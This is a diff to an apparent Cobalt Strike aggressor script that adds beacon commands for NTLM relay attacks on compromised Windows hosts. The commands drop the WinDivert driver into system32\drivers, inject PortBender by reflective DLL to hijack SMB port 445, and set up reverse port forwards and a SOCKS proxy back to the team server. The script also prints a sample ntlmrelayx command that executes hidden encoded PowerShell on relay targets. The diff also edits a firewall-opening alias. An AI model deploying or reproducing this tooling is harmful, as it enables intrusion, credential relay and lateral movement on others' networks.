@@ -21,6 +21,8 @@ $SQLRECON_PATH      = getFileProper("C:\\Tools\\SQLRecon\\SQLRecon\\SQLRecon\\bi
 $SHARPSCCM_PATH     = getFileProper("C:\\Tools\\SharpSCCM\\bin\\Release","SharpSCCM.exe");
 $STANDIN_PATH       = getFileProper("C:\\Tools\\StandIn\\StandIn\\StandIn\\bin\\Release","StandIn.exe");
 $WHISKER_PATH       = getFileProper("C:\\Tools\\Whisker\\Whisker\\bin\\Release","Whisker.exe");
+$WINDIRVERT_DRIVER  = getFileProper("C:\\Tools\\PortBender","WinDivert64.sys");
+$PORTBENDER_DLL     = getFileProper("C:\\Tools\\PortBender","PortBender.dll");
 
 #TEST FUNCTION
 command beacons {
@@ -172,7 +174,7 @@ beacon_command_register(
 
 alias openport {
     #powerpick new-netfirewallrule -displayname "8445-INBOUND" -Direction inbound -protocol tcp -action allow -localport 8445
-    bpowerpick($1, "new-netfirewallrule -displayname \" $+ $2 $- -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
+    bpowerpick($1, "new-netfirewallrule -displayname \" $+ $2 $+ -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
 }
 beacon_command_register(
     "openport",
@@ -1483,4 +1485,86 @@ beacon_command_register(
     "Use Whisker to add certificate to msDS-KeyCredentialLink\n\n"
     . "Usage: shadowcreds_remove [account name] [device id]\n\n"
     . "Use shadowcreds_list to find the device ID."
+)
+alias ntlmrelay_driverupload {
+    local('$handle $driver');
+
+    #import the driver
+    $handle = openf($WINDIRVERT_DRIVER);
+    $driver = readb($handle, -1);
+    closef($handle);
+
+    #upload driver to target
+    bupload_raw($1, "C:\\Windows\\system32\\drivers\\WinDivert64.sys", $driver);
+
+    blog($1, "Make sure and load the PortBender.cna file if needed!");
+}
+beacon_command_register(
+    "ntlmrelay_driverupload",
+    "Upload WinDivert Driver",
+    "Upload WinDivert Driver"
+)
+
+alias ntlmrelay_driverdelete {
+    blog($1, "Removing WinDivert driver...");
+    # bcd($1, "C:\\Windows\\system32\\drivers");
+    brm($1, "C:\\Windows\\system32\\drivers\\WinDivert64.sys");
+}
+beacon_command_register(
+    "ntlmrelay_driverdelete",
+    "Delete WinDivert Driver",
+    "Delete WinDivert Driver"
+)
+
+sub ntlmrelay_relayup_cb {
+    blog($1, $2);
+    $message = 
+    "Example command to run on Team Server to relay NTLM auth:\n\n"
+    . "sudo proxychains ntlmrelayx.py -t smb://<relaytarget> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc <base64>\n";
+    blog($1, $message);
+}
+alias ntlmrelay_relayup {
+    bcd($1, "C:\\Windows\\system32\\drivers");
+
+    #setup rportfwd
+    blog($1, "Reverse port forwarding TCP\\8445 -> TeamServer:445 & TCP\\8080 -> TeamServer:80");
+    brportfwd($1, 8445, 'localhost', 445); #Redirect SMB
+    brportfwd($1, 8080, 'localhost', 80); #redirct for web callbacks
+
+    #setup socks proxy
+    blog($1, "Establishing Socks4a proxy on TeamServer:1080");
+    bsocks($1, 1080)
+
+    #Setup Port Bender
+    $args = "redirect 445 8445";
+
+    blog($1, "Launching PortBender module using reflective DLL injection");
+    blog($1, "Redirecting TCP\\445 -> TCP\\8445");
+    bdllspawn($1, $PORTBENDER_DLL, $args, "PortBender", 5000, false, &ntlmrelay_relayup_cb);
+}
+beacon_command_register(
+    "ntlmrelay_relayup",
+    "Setup Portbender, rportfwd, and socks proxy",
+    "Setup Portbender(445->8445), rportfwd(8445->TX:445), and socks proxy(1080)\n"
+)
+
+alias ntlmrelay_relaydown {
+    #setup rportfwd
+    blog($1, "Killing reverse port forwarding TCP\\8445 -> TeamServer:445 & TCP\\8080 -> TeamServer:80");
+    brportfwd_stop($1, 8445);
+    brportfwd_stop($1, 8080);
+
+    #setup socks proxy
+    blog($1, "Killing Socks4a proxy on TeamServer:1080");
+    bsocks_stop($1);
+
+    #Setup Port Bender
+    bjobs($1);
+    blog($1, "Besure and kill the JOB and associated PROCESS for PortBender!");
+}
+beacon_command_register(
+    "ntlmrelay_relayup",
+    "Stop Portbender, rportfwd, and socks proxy",
+    "Stop Portbender(445->8445), rportfwd(8445->TX:445), and socks proxy(1080)\n\n"
+    . "Besure and kill the JOB and associated PROCESS for PortBender";
 )
